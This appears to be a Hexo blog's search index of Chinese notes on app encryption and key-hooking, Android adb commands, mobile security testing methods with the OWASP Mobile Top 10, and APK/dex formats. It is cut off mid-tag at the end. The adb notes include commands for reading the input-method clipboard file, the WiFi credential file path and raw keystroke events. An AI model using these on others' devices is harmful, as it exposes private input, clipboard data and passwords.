<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>app中常见的加密</title>
      <link href="/2021/06/27/cryptology/"/>
      <url>/2021/06/27/cryptology/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-对称加密算法"><a href="#1-对称加密算法" class="headerlink" title="1. 对称加密算法"></a>1. 对称加密算法</h2><p>mac家族:HamcMd5. 对称性加密<br>DES、AES、3DES</p><ul><li>特点<br>  密钥/生成密钥的方法固定，因此这种加密方式的优点为性能效率较好，而且也较大的提升了解密的成本；但由于密钥固定，因此缺点也很明显了，则是在客户端和服务端上都能找到密钥或密钥的生成方法。因此其突破口为通过逆向客户端来寻找密钥。另外，这种加密方式可同时用于请求包和返回包。</li></ul><h2 id="2-非对称加密算法"><a href="#2-非对称加密算法" class="headerlink" title="2. 非对称加密算法"></a>2. 非对称加密算法</h2><p>RSA、Rabin</p><ul><li>特点:<br>  有一对公钥和私钥<br>  客户端上保存公钥，用于加密；服务端上保存私钥，用于解密。因此这种加密方式的优点为安全性较高，客户端上只有用于加密的公钥，而没有用于解密的私钥；而弱点则为加解密效率不高，性能资源占用较大，所以目前很多App还是选用对称性加密。由于客户端上没有解密数据包的私钥，因此需要使用其他方法获取数据包明文才能进行数据包篡改。另外，由于只有一对公钥和私钥，所以这种加密方式一般只会出现在请求包，而返回包则一般为明文返回。</li></ul><h2 id="3-消息摘要算法"><a href="#3-消息摘要算法" class="headerlink" title="3. 消息摘要算法"></a>3. 消息摘要算法</h2><p>MD家族(MD5 - Message Digest -&gt; 消息摘要算法):md2,md4,md5<br>SHA家族(Secure Hash Algorithm -&gt; 安全散列算法):SHA-1,SHA-256,SHA-512<br>MAC家族(Message Authentication Code -&gt; 消息认证码算法):HamcMd5</p><h3 id="MD-家族"><a href="#MD-家族" class="headerlink" title="MD 家族"></a>MD 家族</h3><table><thead><tr><th>算法</th><th>摘要长度（比特位）</th></tr></thead><tbody><tr><td>HmacMD5</td><td>128</td></tr><tr><td>HmacSHA1</td><td>160</td></tr><tr><td>HmacSHA256</td><td>256</td></tr><tr><td>HmacSHA384</td><td>384</td></tr><tr><td>HmacSHA512</td><td>512</td></tr><tr><td>HmacMD2</td><td>128</td></tr><tr><td>HmacMD4</td><td>128</td></tr><tr><td>HmacSHA224</td><td>224</td></tr></tbody></table><p>终端加解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AES(ECB)加密</span></span><br><span class="line">$ <span class="built_in">echo</span> -n hello | openssl enc -aes-128-ecb -K 616263 -nosalt | base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES(CBC)加密</span></span><br><span class="line">$ <span class="built_in">echo</span> -n hello | openssl enc -aes-128-cbc -iv 0102030405060708 -K 616263 -nosalt | base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES(ECB)解密</span></span><br><span class="line">$ <span class="built_in">echo</span> -n d1QG4T2tivoi0Kiu3NEmZQ== | base64 -D | openssl enc -aes-128-ecb -K 616263 -nosalt -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES(CBC)解密</span></span><br><span class="line">$ <span class="built_in">echo</span> -n u3W/N816uzFpcg6pZ+kbdg== | base64 -D | openssl enc -aes-128-cbc -iv 0102030405060708 -K 616263 -nosalt -d</span><br></pre></td></tr></table></figure><h2 id="4-自定义算法加密"><a href="#4-自定义算法加密" class="headerlink" title="4. 自定义算法加密"></a>4. 自定义算法加密</h2><pre><code>有少数App开发的技术人员还会使用自定义算法来对数据包进行加密，算法五花八门，大多为各种常见的编码（如Base64）和字节位移运算等混杂。这种加密方式的优点为效率较高，但缺点为算法硬编码在客户端中，只要通过逆向即可解密出来。通过逆向App获取密钥/算法来进行解密，但是开发者往往会通过其他手段来增强安全性，如App加固或把密钥/算法硬编码在so文件中等；这样就更进一步地提高了逆向与解密的难度和成本了。</code></pre><hr><h1 id="app自吐算法"><a href="#app自吐算法" class="headerlink" title="app自吐算法"></a>app自吐算法</h1><h2 id="java层"><a href="#java层" class="headerlink" title="java层:"></a>java层:</h2><p>hook java加密算法相关类方法</p><h2 id="java层加密常用接口"><a href="#java层加密常用接口" class="headerlink" title="java层加密常用接口:"></a>java层加密常用接口:</h2><p>javax.crypto</p><ul><li>AES<h3 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h3></li></ul><ol><li>流加密 (如OFB、CFB等)<br>CFB模式：<br>　　优点：<br>　　1.隐藏了明文模式;<br>　　2.分组密码转化为流模式;<br>　　3.可以及时加密传送小于分组的数据;<br>　　缺点:<br>　　1.不利于并行计算;<br>　　2.误差传送：一个明文单元损坏影响多个单元;<br>　　3.唯一的IV;<br>ofb模式：<br>　　优点:<br>　　1.隐藏了明文模式;<br>　　2.分组密码转化为流模式;<br>　　3.可以及时加密传送小于分组的数据;<br>　　缺点:<br>　　1.不利于并行计算;<br>　　2.对明文的主动攻击是可能的;<br>　　3.误差传送：一个明文单元损坏影响多个单元;</li><li>块加密 (如ECB、CBC等)<br>ECB模式<br>　　优点:<br>　　1.简单；<br>　　2.有利于并行计算；<br>　　3.误差不会被传送；<br>　　缺点:<br>　　1.不能隐藏明文的模式；<br>　　2.可能对明文进行主动攻击；<br>CBC模式：<br>　　优点：<br>　　1.不容易主动攻击,安全性好于ECB,适合传输长度长的报文,是SSL、IPSec的标准。<br>　　缺点：<br>　　1.不利于并行计算；<br>　　2.误差传递；<br>　　3.需要初始化向量IV</li></ol><h3 id="填充模式"><a href="#填充模式" class="headerlink" title="填充模式"></a>填充模式</h3><ul><li><p>ZeroPadding，数据长度不对齐时使用0填充，否则不填充。</p></li><li><p>PKCS7Padding，假设数据长度需要填充n(n&gt;0)个字节才对齐，那么填充n个字节，每个字节都是n;- 如果数据本身就已经对齐了，则填充一块长度为块大小的数据，每个字节都是块大小。</p></li><li><p>PKCS5Padding，PKCS7Padding的子集，块大小固定为8字节。</p></li><li><p>DES</p></li><li><p>RSA</p><h2 id="java层加密步骤"><a href="#java层加密步骤" class="headerlink" title="java层加密步骤:"></a>java层加密步骤:</h2></li></ul><ol><li>初始化key</li><li>cipher 确定加密模式 (getInstance init)</li><li>执行加密(dofinal)</li></ol><h2 id="so层"><a href="#so层" class="headerlink" title="so层:"></a>so层:</h2><p>hook openssl编译动态库</p><hr><hr><p>参考:<br>AES:<a href="https://zhuanlan.zhihu.com/p/131324301">https://zhuanlan.zhihu.com/p/131324301</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIUI的正确使用</title>
      <link href="/2021/05/07/miui12-android11/"/>
      <url>/2021/05/07/miui12-android11/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>miui自带搜狗输入法剪切板路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/data/data/com.sohu.inputmethod.sogou.xiaomi/files/sogou_clipboard</span><br><span class="line"></span><br><span class="line">umi:/data/data/com.sohu.inputmethod.sogou.xiaomi/files # </span><br><span class="line">sed ‘/[/r 1.txt’ sogou_clipboard</span><br><span class="line">sed ‘/[/a &#123;&quot;time&quot;:1623287535604,&quot;content&quot;:&quot;wow&quot;&#125;,’ sogou_clipboard</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取剪切板内容</span></span><br><span class="line">adb shell am startservice top.q0o0p.getclipboard/.ClipboardService</span><br><span class="line">am broadcast -a clipper.set -e text <span class="string">&quot;this can be pasted now&quot;</span></span><br><span class="line">am broadcast -a clipper.get</span><br><span class="line"></span><br><span class="line"><span class="comment"># wifi</span></span><br><span class="line">/data/misc/wifi/wpa_supplicant.conf</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 获取键盘记录</span></span><br><span class="line">adb shell getevent -ltr </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看apk的版本（无需解压）</span></span><br><span class="line">aapt dump badging abcd.apk |grep version</span><br><span class="line"><span class="comment"># 查看有哪些温度区域thermal zone</span></span><br><span class="line">adb shell ls sys/class/thermal/</span><br><span class="line"><span class="comment"># 查看某个CPU温度</span></span><br><span class="line">cat /sys/class/thermal/thermal_zone0/temp </span><br><span class="line"></span><br><span class="line"> <span class="comment"># 取开机日志</span></span><br><span class="line">adb wait-for-device &amp;&amp; adb shell logcat -v threadtime | tee mybootup.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看日志</span></span><br><span class="line">adb logcat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭/重启adb服务进程</span></span><br><span class="line">adb kill-server</span><br><span class="line">adb start-server</span><br><span class="line"><span class="comment"># output是0或1，0代表关闭，1反之</span></span><br><span class="line"> adb shell settings get global bluetooth_on</span><br><span class="line"></span><br><span class="line"> adb shell settings put global bluetooth_on 1</span><br></pre></td></tr></table></figure><p>字体 :<br>/system/font</p><p>命令：<br>/system/bin</p><p>传递资料路径：<br>/storage/emulated/0/q0o0p</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>移动安全之旅</title>
      <link href="/2021/05/06/mobile-security-top10/"/>
      <url>/2021/05/06/mobile-security-top10/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="常用的测试技术"><a href="#常用的测试技术" class="headerlink" title="常用的测试技术"></a>常用的测试技术</h2><p>• 黑盒测试(DAST)是在测试人员尚未知晓任何关于被测 App 的信息的情况下实行的。这个过程常常被<br>称为“无知测试”。这种测试的主要目的在于使得测试者表现得像一个真实攻击者，在某种意<br>义上探索对外公开和可获取的信息的可能用途。<br>• 白盒测试（SAST,有时被称作是“充分认知测试”）是与黑盒测试完全相反的，在某种意义上测试人<br>员拥有关于 App 的充分认知。这方面认知可能包含源代码、文档和示意图。这种方法使它进<br>行得比黑盒测试快得多，因为它是透明的，并且通过获取额外的知识测试人员可以构建更精<br>细的和细粒度的测试用例。<br>• 灰盒测试是指介于上述两种测试类型之间的所有测试：一些信息提供给了测试人员（通常只<br>有认证信息），而其他信息就是需要被发现的。这种类型的测试在测试用例的数量、成本、<br>速度和测试范围方面是一种有意义的中和。灰盒测试在安全行业是最普遍的测试类型。</p><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><ul><li>常用的工具: AWVS、AppScan</li><li>实现原理<br>1）通过爬虫发现整个 Web 应用结构，爬虫会发现被测Web程序有多少个目录，多少个页面，页面中有哪些参数；</li></ul><p>2）根据爬虫的分析结果，对发现的页面和参数发送修改的 HTTP Request 进行攻击尝试（扫描规则库）；</p><p>3）通过对于 Response 的分析验证是否存在安全漏洞。</p><ul><li>优点</li></ul><ol><li>测试人员无需具备编程能力，无需了解应用程序的内部逻辑结构，不区分测试对象的实现语言，采用攻击特征库来做漏洞发现与验证，能发现大部分的高风险问题</li><li>DAST除了可以扫描应用程序本身之外，还可以扫描发现第三方开源组件、第三方框架的漏洞。</li></ol><ul><li>缺点</li></ul><ol><li>尽可能的把应用程序的结构爬取完整;</li><li>需要对被测应用程序发送漏洞攻击包;</li><li>业务分支覆盖不全;(应用程序含有AJAX页面、CSRF Token页面、验证码页面、API孤链、POST表单请求或者是设置了防重放攻击策略，这些页面无法被网络爬虫发现，即使爬到一个表单，要提交内容，服务端对内容做判断，是手机号码则进入业务1，不是手机号码进入业务2，爬虫不可能知道这里要填手机号码，所以业务分支1永远不会检测到。)</li><li>必须发送漏洞攻击包来进行安全测试，这就需要不断更新漏洞扫描插件，而且这种测试方式会对业务测试造成一定的影响，安全测试的脏数据会污染业务测试的数据。</li><li>测试对象为HTTP/HTTPS的Web应用程序，对于IOS/Android上的APP也无能为力。</li></ol><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><ul><li>实现原理<br>1） 首先通过调用语言的编译器或者解释器把前端的语言代码（如JAVA，C/C++源代码）转换成一种中间代码，将其源代码之间的调用关系、执行环境、上下文等分析清楚。</li></ul><p>2）语义分析：分析程序中不安全的函数，方法的使用的安全问题。</p><p>3）数据流分析：跟踪，记录并分析程序中的数据传递过程所产生的安全问题。</p><p>4）控制流分析：分析程序特定时间，状态下执行操作指令的安全问题。</p><p>5）配置分析：分析项目配置文件中的敏感信息和配置缺失的安全问题。</p><p>6）结构分析：分析程序上下文环境，结构中的安全问题。</p><p>7）结合2）-6）的结果，匹配所有规则库中的漏洞特征，一旦发现漏洞就抓取出来。</p><p>8）最后形成包含详细漏洞信息的漏洞检测报告，包括漏洞的具体代码行数以及漏洞修复的建议。</p><ul><li><p>优点<br>优势是代码具有高度可视性，能够检测更丰富的问题，包括漏洞及代码规范等问题。测试对象比DAST丰富，除Web应用程序之外还能够检测APP的漏洞，不需要用户界面，可通过IDE插件形式与集成开发环境（如Eclipse、IntelliJ IDEA）结合，实时检测代码漏洞问题，漏洞发现更及时，修复成本更低。</p></li><li><p>缺点<br>SAST需要从语义上理解程序的代码、依赖关系、配置文件。</p></li></ul><ol><li><p>另一方面SAST不仅需要区分不同的开发语言（PHP、C＃、ASP、.NET、Java、Python等），还需要支持使用的Web程序框架，如果SAST工具不支持某个应用程序的开发语言和框架，那么测试时就会遇到障碍。DAST支持测试任何语言和框架开发的HTTP/HTTPS应用程序。</p></li><li><p>传统的SAST扫描时间很慢，如果是用SAST去扫描代码仓库，需要数小时甚至数天才能完成，这在日益自动化的持续集成和持续交付（CI/CD）环境中效果不佳。</p></li><li><p>还有一点是SAST的误报，业界商业级的SAST工具误报率普遍在30%以上，误报会降低工具的实用性，可能需要花费更多的时间来清除误报而不是修复漏洞。</p></li><li><p>SAST只对源代码进行检测，而不会分析整个应用程序，这迫使企业需要购买单独的软件组合分析工具（SCA），即使是SCA也只是识别公开的漏洞；</p></li><li><p>开源、第三方API或框架中的未知漏洞超出了SAST和SCA的范围。</p></li></ol><h3 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h3><ul><li>实现原理<br>IAST的实现模式较多，常见的有代理模式、VPN、流量镜像、插桩模式，本文介绍最具代表性的2种模式，代理模式和插桩模式。</li></ul><p>代理模式，在PC端浏览器或者移动端APP设置代理，通过代理拿到功能测试的流量，利用功能测试流量模拟多种漏洞检测方式对被测服务器进行安全测试。</p><p>插桩模式，插桩模式是在保证目标程序原有逻辑完整的情况下，在特定的位置插入探针，在应用程序运行时，通过探针获取请求、代码数据流、代码控制流等，基于请求、代码、数据流、控制流综合分析判断漏洞。插桩模式具体实现有2种模式，Active 插桩和Passive 插桩。</p><ol><li>代理模式实现原理<br>a. 功能测试人员在浏览器或者APP中设置代理，将IAST设备地址填入；</li></ol><p>b. 功能测试人员开始功能测试，测试流量经过IAST设备，IAST设备将流量复制一份，并且改造成安全测试的流量；</p><p>c. IAST设备利用改造后的流量对被测业务发起安全测试，根据返回的数据包判断漏洞信息。</p><p>插桩需要在服务器中部署Agent，不同的语言不同的容器要不同的Agent，这对有些用户来说是不可接受的。而代理模式不需要服务器中部署Agent，只是测试人员要配置代理，安全测试会产生一定的脏数据，漏洞的详情无法定位到代码片段，适合想用IAST技术又不接受在服务器中部署Agent的用户使用。<br>2) Active插桩实现原理<br>a. 被测试服务器中安装IAST插桩 Agent；</p><p>b. DAST Scanner发起扫描测试；</p><p>c. IAST插桩 Agent追踪被测试应用程序在扫描期间的反应附加测试，覆盖率和上下文，将有关信息发送给Management Server，Management Server展示安全测试结果。</p><p>Active 插桩模式需要在被测试应用程序中部署插桩 Agent，使用时需要外部扫描器去触发这个Agent。一个组件产生恶意攻击流量，另一个组件在被测应用程序中监测应用程序的反应，由此来进行漏洞定位和降低误报。</p><p>Active 插桩模式更像是一种改进版的DAST技术，目前最新的AWVS、AppScan已经采用了Active 插桩模式。AWVS集成了“AcuSensor”模块，通过在源代码中部署传感器来增强定期动态扫描。AcuSensor能够在AWVS扫描期间检查Web应用程序执行时的源代码，在后端抓取应用程序，提供100％爬行覆盖率，查找并测试在黑盒扫描期间未发现的隐藏输入。AppScan则是集成了“Glass Box”服务模块，这使得AppScan支持 Web 2.0、JavaScript 和 AJAX 框架。</p><p>Active 插桩模式解决了传统DAST漏报和无法精确定位漏洞位置的问题，需要先做扫描，扫描触发漏洞需要一定的时间，而且扫描会对业务测试产生影响。在双向HTTPS加密、CSRF Token页面、防攻击重放等场景下Active 插桩模式依然无法进行安全测试。</p><ol start="3"><li>Passive 插桩实现原理</li></ol><p>a. 被测试服务器中安装插桩 Agent；</p><p>b. 插桩 Agent在应用程序运行时获取请求和代码数据流、代码控制流；</p><p>c. 插桩Agent将获取的信息发送给Management Sever，Management Sever展示安全测试结果。</p><p>Passive 插桩在程序运行时监视应用并分析代码，它不会主动对Web应用程序执行攻击，而是纯粹被动地分析检测代码。这实际上是一个巨大的优势，因为它不会影响同时运行的其他测试活动，并且只需要业务测试（手动或自动）来触发安全测试，有测试流量过来就可以实时的进行漏洞检测。</p><p>插桩模式的关键是Agent，Agent需要根据不同语言进行开发，但是功能基本相同：</p><p>获取请求数据和返回数据；<br>代码执行中的参数传递；<br>数据库查询（如ODBC）；<br>目录查询（如LDAP），文件系统权限；<br>监听内存中特定的值，识别受污染的输入；<br>第三方库的使用;<br>对外部应用程序和服务的调用；<br>特定代码的执行等。</p><p><a href="https://www.aqniu.com/learn/46910.html">https://www.aqniu.com/learn/46910.html</a></p><hr><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>当android系统启动时候init.rc会去读取两个系统配置文件</p><p>系统配置文件两个：<br>/system/build.prop<br>/default.prop<br>default.prop里面有一个重要属性：ro.debuggable 如果为1，所有进程都可以调试。不管apk的AndroidManifest.xml里面是否有android:debuggable=true都可以进行调试。 修改ro.debuggable有三种方式：</p><p>a.直接修改default.prop文件中的值。然后重启设备。<br>b.改写系统文件，重新编译系统镜像，然后刷入到设备<br>c.注入init进程（linux系统启动的第一个进程也就是0号进程），修改内存中的属性值。</p><p><a href="https://www.aqniu.com/learn/46910.html">https://www.aqniu.com/learn/46910.html</a></p><hr><h2 id="OWASP-移动-Top10"><a href="#OWASP-移动-Top10" class="headerlink" title="OWASP 移动 Top10"></a>OWASP 移动 Top10</h2><p>Web 应用程序开放安全项目（OWASP）是涉及安全和漏洞搜索的标准之一。 它还发布了前 10 名漏洞的列表，其中包括在各种平台中最常见和重要的漏洞。</p><p>可以在<a href="https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks%E4%B8%8A%E6%89%BE%E5%88%B0">https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks上找到</a> OWASP 移动版的前 10 个指南。 如果我们查看 OWASP 移动项目，以下是它涵盖的移动应用程序的 10 个安全问题：</p><ul><li>服务端弱控制</li><li>不安全的数据存储</li><li>传输层保护不足</li><li>意外的数据泄漏</li><li>缺少授权和认证</li><li>无效的加密</li><li>客户端注入</li><li>通过不可信输入的安全决策</li><li>不正确的会话处理</li><li>缺乏二进制保护</li></ul><h3 id="服务端弱控制"><a href="#服务端弱控制" class="headerlink" title="服务端弱控制"></a>服务端弱控制</h3><p>第一个 OWASP 漏洞是服务端弱控制，顾名思义，服务端不以安全的方式将数据从移动应用程序发送到服务端，或者在发送数据时暴露一些敏感的 API。 例如，考虑一个 Android 应用程序发送登录凭据到服务器进行身份验证，而不验证输入。 攻击者可以以这样的方式修改凭证，以便访问服务器的敏感或未授权区域。 此漏洞可视为移动应用程序和 Web 应用程序中的一个漏洞。</p><h3 id="不安全的数据存储"><a href="#不安全的数据存储" class="headerlink" title="不安全的数据存储"></a>不安全的数据存储</h3><p>这仅仅意味着，应用相关信息以用户可访问的方式在设备上存储。 许多 Android 应用程序在共享首选项，SQLite（纯文本格式）或外部存储器中，存储与用户相关的私密信息或应用程序信息。 开发人员应该始终记住，即使应用程序在数据文件夹（/data/data/package-name）中存储敏感信息，只要手机已 root，恶意应用程序/攻击者就可以访问它。</p><h3 id="传输层保护不足"><a href="#传输层保护不足" class="headerlink" title="传输层保护不足"></a>传输层保护不足</h3><p>许多 Android 开发人员依赖于通过不安全模式的网络来发送数据，例如 HTTP 或没有正确实现 SSL 的形式。 这使得应用程序易受到网络上发生的所有不同类型的攻击，例如流量拦截，从应用程序向服务器发送数据时操纵参数，以及修改响应来访问应用程序的锁定区域。</p><h3 id="意外的数据泄漏"><a href="#意外的数据泄漏" class="headerlink" title="意外的数据泄漏"></a>意外的数据泄漏</h3><p>当应用程序将数据存储在本身易受攻击的位置时，会出现此漏洞。 这些可能包括剪贴板，URL 缓存，浏览器 Cookie，HTML5DataStorage，统计数据等。 一个例子是用户登录到他们的银行应用程序，他们的密码已经复制到剪贴板。 现在，即使是恶意应用程序也可以访问用户剪贴板中的数据。</p><h3 id="缺少授权和认证"><a href="#缺少授权和认证" class="headerlink" title="缺少授权和认证"></a>缺少授权和认证</h3><p>如果 Android 应用程序或一般的移动应用程序在没有适当安全措施的情况下，尝试基于客户端检查来验证或授权用户，则这些应用程序最容易受到攻击。 应该注意的是，一旦手机已 root，大多数客户端保护可以被攻击者绕过。 因此，建议应用程序开发人员使用服务器端身份验证和授权进行适当的检查，一旦验证成功，请使用随机生成的令牌，以便在移动设备上验证用户。</p><h3 id="无效的加密"><a href="#无效的加密" class="headerlink" title="无效的加密"></a>无效的加密</h3><p>这仅仅表示使用不安全的密码函数来加密数据部分。 这可能包括一些已知存在漏洞的算法，如 MD5，SHA1，RC2，甚至是没有适当的安全措施的定制算法。</p><h3 id="客户端注入"><a href="#客户端注入" class="headerlink" title="客户端注入"></a>客户端注入</h3><p>这在Android应用程序中是可行的，主要成因是使用 SQLite 进行数据存储。 我们将在本书的各章中执行注入攻击。</p><h3 id="通过不可信输入的安全决策"><a href="#通过不可信输入的安全决策" class="headerlink" title="通过不可信输入的安全决策"></a>通过不可信输入的安全决策</h3><p>在移动应用程序中，开发人员应始终过滤和验证用户提供的输入或其他相关输入，并且不应该像在应用程序中那样使用它们。 不受信任的输入通常会导致应用程序中的其他安全风险，如客户端注入。</p><h3 id="不正确的会话处理"><a href="#不正确的会话处理" class="headerlink" title="不正确的会话处理"></a>不正确的会话处理</h3><p>在为移动应用程序执行会话处理时，开发人员需要处理很多因素，例如认证 cookie 的正常过期，安全令牌创建，cookie 生成和轮换，以及无法使后端的会话无效。 必须在 Web 应用程序和 Android 应用程序之间维护正确的安全同步。</p><h3 id="缺乏二进制保护"><a href="#缺乏二进制保护" class="headerlink" title="缺乏二进制保护"></a>缺乏二进制保护</h3><p>这意味着不能正确地防止应用程序被逆向或反编译。 诸如 Apktool 和 dex2jar 之类的工具可用于逆向 Android 应用程序，如果没有遵循正确的开发实践，它会暴露应用程序的各种安全风险。 为了防止通过逆向攻击来分析应用程序，开发人员可以使用 ProGuard 和 DashO 等工具。</p><hr><p>参考:<br><a href="https://wizardforcel.gitbooks.io/lpad/content/ch3.html">https://wizardforcel.gitbooks.io/lpad/content/ch3.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习路线整理中...</title>
      <link href="/2021/04/23/reverse-leaning/"/>
      <url>/2021/04/23/reverse-leaning/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h1><h2 id="1-1-APK文件格式"><a href="#1-1-APK文件格式" class="headerlink" title="1.1 APK文件格式"></a>1.1 APK文件格式</h2><h3 id="1-1-1-常见文件格式jar、apk、dex、Manifest、resource、Meta"><a href="#1-1-1-常见文件格式jar、apk、dex、Manifest、resource、Meta" class="headerlink" title="1.1.1 常见文件格式jar、apk、dex、Manifest、resource、Meta"></a>1.1.1 常见文件格式jar、apk、dex、Manifest、resource、Meta</h3><ul><li>JAR<br>  可被像编译器和 JVM 这样的工具直接使用。在 JAR 中包含特殊的文件，如 manifests 和部署描述符.<br>  (1) 安全性,可以对整个jar包的内容进行签名。<br>  (2) 减少了下载时间<br>  如果applet被打包成一个jar文件，那么所有相关的资源就可以在一个HTTP transaction中下载完成，而无需为每一个文件新建一个连接。<br>  (3) 压缩,可移植<br>  (4) 容易扩展(通过jar这种格式，可以和容易地将自己的程序打包提供给别人使用。)<br>  (5) 包密封(Package Sealing)被密封，来保证版本的一致性。密封可以保证一个包中的所有类都来自同一个jar文件。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    //运行一个打包为可执行 JAR 文件的应用程序</span><br><span class="line">java -jar app.jar</span><br><span class="line"></span><br><span class="line">jar -cvfM HelloWorld.jar HelloWorld.class   <span class="comment">#将HelloWorld.class文件打入jar包</span></span><br><span class="line">jar -tf HelloWorld.jar  HelloWorld.class</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><strong>apk</strong><br>  **META-INF文件夹:**Jar文件中常见<br>  **MANIFEST.MF:**清单文件<br>  <strong>CERT.RSA:</strong> 保存着该应用程序的证书和授权信息。<br>  <strong>CERT.SF:</strong> 保存着SHA-1信息资源列表，<br>  <strong>Signature-Version:</strong> 1.0Created-By: 1.0(Android)SHA1-Digest-Manifest : wxqnEAI0UA5nO5QJ8CGMwjkGGWE =… Name: res/ layout/ exchange_ component _back _bottom. xmlSHA1- Digest: eACjMjESj7Zkf0cBFTZ0nqWrt7w = …Name:res/drawable-hdpi/<a href="https://q0o0p.top/2021/04/23/reverse-leaning/icon.pngSHA1-Digest">https://q0o0p.top/2021/04/23/reverse-leaning/icon.pngSHA1-Digest</a>: DGEqylP8W0n0iV/ZzBx3MW0WGCA=<br>  res: APK所需要的资源文件夹。<br>  <strong>AndroidManifest.xml:</strong> 一个传统的Android清单文件，用于描述该应用程序的名字、版本号、所需权限、注册的服务、链接的其他应用程序。该文件使用XML文件格式，可以编译为二进制的XML，使用的工具为AXMLPrinter2或apktool 。<br>  **classes.dex:**classes文件通过DEX编译后的文件格式，用于在Dalvik虚拟机上运行的主要代码部分。<br> **resources.arsc:**程序的语言文件，可以透过这软件用(AndroidResEdit等工具)来进行翻译，也可以用ApkTool等工具反编译后再开始进行软件修改。- </li><li><strong>dex</strong><br>① dex文件结构解析</li></ul><p><img src="https://q0o0p.top/2021/04/23/reverse-leaning/2.png"><br><img src="https://q0o0p.top/2021/04/23/reverse-leaning/1.png"><br>② dex数据结构</p><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>u1</td><td>等同于uint8_t，表示1字节的无符号数</td></tr><tr><td>u2</td><td>等同于uint16_t，表示2字节的无符号数</td></tr><tr><td>u4</td><td>等同于uint32_t，表示4字节的无符号数</td></tr><tr><td>u8</td><td>等同于uint64_t，表示8字节的无符号数</td></tr><tr><td>sleb128</td><td>有符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128</td><td>无符号LEB128，可变长度1~5字节</td></tr><tr><td>uleb128p1</td><td>无符号LEB128加1，可变长度1~5字节</td></tr></tbody></table><ul><li><strong>manifest</strong><br>(1) 为应用的 Java 软件包命名。软件包名称充当应用的唯一标识符<br>(2) 描述应用的各个组件，即：构成应用的 Activity、服务（Service）、广播接收器（BroadcastReceiver）和内容提供程序（ContentProvider）。 为实现每个组件的类命名并发布其功能（例如，它们可以处理的 Intent 消息）。根据这些声明，Android 系统可以了解这组件具体是什么，以及在什么条件下可以启动它们<br>(3) 确定将托管应用组件的进程<br>(4) 声明应用必须具备哪些权限才能访问 API 中受保护的部分并与其他应用交互<br>(5) 还声明其他应用与该应用组件交互所需具备的权限<br>(6) 列出 Instrumentation类，这些类可在应用运行期间提供分析和其他信息。这些声明只会在应用处在开发和测试阶段时出现在清单文件中；它们会在应用发布之前被删除<br>(7) 声明应用所需的最低 Android API 级别<br>(8) 列出应用必须链接到的库</li></ul><p>只有<manifest>和 